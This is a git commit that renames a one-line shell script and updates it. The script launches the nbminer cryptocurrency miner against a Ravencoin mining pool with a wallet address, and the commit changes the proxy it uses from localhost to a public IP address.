039d29fd566952aaa98702c1fb4b2520e5c66013
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-04-14 13:33:00 +0200

    Update and rename ravenminerWithProxy.sh to RVNMwSocks1.sh

---
+++ RVNMwSocks1.sh
@@ -0,0 +1,1 @@
+./nbminer -a kawpow -o stratum+ssl://stratum.ravenminer.com:13838 -u RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj.NB -log --proxy 139.177.202.146:9999
--- ravenminerWithProxy.sh
+++
@@ -1,1 +0,0 @@
-./nbminer -a kawpow -o stratum+ssl://stratum.ravenminer.com:13838 -u RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj.NB -log --proxy 127.0.0.1:9999
